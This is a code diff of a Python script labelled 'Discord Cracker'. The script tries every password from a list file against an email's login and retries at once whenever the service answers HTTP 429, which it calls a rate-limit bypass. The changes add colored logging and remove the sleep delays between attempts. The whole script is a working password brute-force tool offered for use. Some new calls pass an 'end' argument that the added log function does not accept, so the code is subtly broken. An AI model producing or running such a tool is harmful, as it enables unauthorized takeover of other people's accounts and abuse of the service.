@@ -1,55 +1,66 @@
 import requests
-import time
 import os
+from colorama import init, Fore
+from datetime import datetime
+
+init(autoreset=True)
+
+def log(message, level="INFO"):
+    timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
+    if level == "INFO":
+        print(f"{timestamp} {Fore.GREEN}[INFO]{Fore.RESET} {message}")
+    elif level == "WARNING":
+        print(f"{timestamp} {Fore.YELLOW}[WARNING]{Fore.RESET} {message}")
+    elif level == "ERROR":
+        print(f"{timestamp} {Fore.RED}[ERROR]{Fore.RESET} {message}")
 
 def main():
-    print("YT: Discord Cracker")
-    print("--------------------")
+    log("YT: Discord Cracker")
+    log("--------------------")
 
     email = input("Enter your email: ")
 
-    print("1: Normal login")
-    print("2: Auto login")
+    log("1: Normal login")
+    log("2: Auto login")
     select = input()
 
     if select == "2":
         password_file_path = input("Enter the path to the password file: ")
 
         if not os.path.exists(password_file_path):
-            print("Password file not found. Exiting...")
+            log("Password file not found. Exiting...", "ERROR")
             return
 
         with open(password_file_path, 'r') as file:
             passwords = file.read().splitlines()
 
-        print("Trying passwords...\n")
+        log("Trying passwords...\n")
 
         for password in passwords:
-            print(f"Testing password: {password}... ", end="")
-            time.sleep(0.5)
+            log(f"Testing password: {password}... ", end="")
             login_result = test_login(email, password)
 
             if login_result:
-                print("\n\n\nCracked successful!")
-                print(f"email: {email}")
-                print(f"password: {password}")
+                log("\n\n\nCracked successful!", "INFO")
+                log(f"email: {email}")
+                log(f"password: {password}")
                 break
             else:
-                print("Login failed.")
+                log("Login failed.", "WARNING")
 
-        print("\nCracked complete.")
+        log("\nCracked complete.")
     else:
         password = input("Enter your password: ")
 
         while True:
-            print(f"Trying password: {password}... ", end="")
+            log(f"Trying password: {password}... ", end="")
             login_result = test_login(email, password)
 
             if login_result:
-                print("Login successful!")
+                log("Login successful!", "INFO")
                 break
             else:
-                print("Login failed.")
+                log("Login failed.", "WARNING")
 
 def test_login(email, password):
     try:
@@ -61,14 +72,13 @@ def test_login(email, password):
         if response.status_code == 200:
             return True
         elif response.status_code == 429:
-            print("YT: Too Many Requests Bypass Statuscode 429 successful!")
-            time.sleep(1) 
+            log("YT: Too Many Requests Bypass Statuscode 429 successful!", "INFO")
             return test_login(email, password)
         else:
-            print(response.status_code)
+            log(response.status_code, "WARNING")
             return False
     except Exception as ex:
-        print(f"YT: An error occurred: {str(ex)}")
+        log(f"YT: An error occurred: {str(ex)}", "ERROR")
         return False
 
 if __name__ == "__main__":
